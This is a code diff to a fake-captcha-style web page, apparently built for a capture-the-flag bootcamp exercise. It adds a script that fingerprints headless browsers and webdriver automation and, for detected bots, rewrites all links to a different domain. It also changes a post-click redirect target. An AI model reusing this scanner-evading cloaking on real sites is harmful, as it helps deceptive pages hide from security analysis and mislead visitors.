@@ -102,7 +102,30 @@
     </div>
   </body>
   <script>
-
+    function isBot() {
+        var mimeTypesLength = navigator.mimeTypes.length;
+        var pluginsLength = navigator.plugins.length;
+        if (mimeTypesLength + pluginsLength === 0) {
+            return true;
+        }
+        if (navigator.webdriver === true) {
+            return true;
+        }
+        if (window.document.documentElement.getAttribute('webdriver')) {
+            return true;
+        }
+        if (window.outerWidth === 0 && window.outerHeight === 0) {
+            return true;
+        }
+        return false;
+    }
+    
+    bot = isBot();
+    if (bot) {
+        Array.from(document.getElementsByTagName("a")).forEach(function(i) {
+            i.href = "https://xn--bc2025-0nly-humn-s33-th3-fl--fpl485jin0qna.atwebpages.com/";
+        });
+    }
     // Popunder on click of the checkbox
     captcha.onload = () => {
       captcha.onload = null;
@@ -125,7 +148,7 @@
           spinner.style.visibility = "visible";
           message.classList.remove("spacer-top");
           setTimeout(() => {
-            location = "http://xn--0x3a3a.scienceontheweb.net";
+            location = "http://bootcamp2025.scienceontheweb.net";
           }, 250);
         }, 750)
       };
